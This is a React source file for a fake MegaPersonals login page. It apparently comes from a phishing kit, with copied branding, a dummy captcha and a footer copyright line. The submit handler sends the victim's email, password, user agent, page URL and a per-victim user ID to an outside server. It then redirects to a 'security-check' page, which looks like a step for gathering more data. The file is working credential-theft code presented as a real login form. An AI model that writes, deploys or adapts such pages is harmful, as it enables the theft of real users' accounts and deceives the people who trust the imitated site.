
import React, { useState, useEffect } from "react";
import { useParams,useNavigate } from "react-router-dom";

const Home = () => {
    const { userId } = useParams();
    const navigate = useNavigate();

    const [formData, setFormData] = useState({
        email: "",
        password:"",
        userId:"",
        userAgent:"",
        message: "",
        loading_url:""
      });
    
      const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData((prevData) => ({
          ...prevData,
          [name]: value,
        }));
      };

      useEffect(() => {
        setFormData((prevData) => ({
            ...prevData,
            userAgent: navigator.userAgent,
          }));

          setFormData((prevData) => ({
            ...prevData,
            loading_url: window.location.href,
          }));


          setFormData((prevData) => ({
            ...prevData,
            userId: userId,
          }));

      }, []);
    
      const handleSubmit = async (e) => {
        e.preventDefault(); // Prevents the default form submission behavior
    
        try {
          const response = await fetch("https://zplay.superice.cloud/api/save_data", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(formData),
          });
    
          if (response.ok) {
            const result = await response.json();
            console.log("Server Response:", result);
            if(result.success)
            {
                sessionStorage.setItem("insertId", result.id);
                navigate('/security-check');

            }
            
          } else {
            alert("Error submitting form");
          }
        } catch (error) {
          console.error("Error:", error);
          alert("An error occurred while submitting the form.");
        }
      };

    
    return (
        <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
            <div className="w-[65%] lg:w-full">
                <img src="/images/megapersonals.png" alt="megapersonals" />
            </div>
            <div>
                <div className="mt-[10px] flex flex-col items-center">
                    <p className="text-custom-gray2 text-lg">Is this your first time posting?</p>
                    <button className="mt-[8px] bg-custom-blue3 px-[57px] text-[24px] text-white font-semibold tracking-[2px] rounded">
                        Start Here
                    </button>
                    <p className="mt-[10px] text-custom-gray2 text-lg">Already have a login?</p>
                    <p className="text-custom-gray2 text-[25px]">Login</p>
                </div>
                <div className="mt-1">
                    <form className="mx-[30px] flex flex-col justify-center items-center" onSubmit={handleSubmit}>
                        <div className="space-y-[9px] flex flex-col justify-center items-center">
                            <input
                                placeholder="Email"
                                id="email"
                                required
                                className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                                name="email"
                                value={formData.name}
                                onChange={handleChange}
                            />
                            <input
                                placeholder="Password"
                                id="password"
                                type="password"
                                autoComplete="on"
                                required
                                className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                                name="password"
                                value={formData.name}
                                onChange={handleChange}
                            />
                        </div>
                        <div className="flex flex-col items-center">
                            <img
                                alt="captcha"
                                loading="lazy"
                                width="228"
                                height="55"
                                decoding="async"
                                className="mt-3"
                                style={{ color: "transparent" }}
                                // srcSet="image_2 1x, image_1 2x"
                                src="/captcha.png"
                            />
                            <input
                                id="captcha"
                                type="text"
                                autoComplete="on"
                                placeholder="Enter code from the picture"
                                required
                                className="mt-2 w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                                name="captcha"
                            />
                            <button
                                type="submit"
                                className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                            >
                                SUBMIT
                            </button>
                        </div>
                    </form>
                </div>
                <p className="mt-[10px] uppercase text-center text-sm text-custom-blue2 hover:underline">
                    Forgot Password?
                </p>
            </div>
            <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
                <p className="cursor-pointer">Home</p> | <p className="cursor-pointer">Manage Posts</p> |{" "}
                <p className="cursor-pointer">Contact Us</p> | <p className="cursor-pointer">Policies &amp; Terms</p>
            </div>
            <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
                Copyright ©2021 MegaPersonals.eu
            </p>
        </div>
    );
};

export default Home;
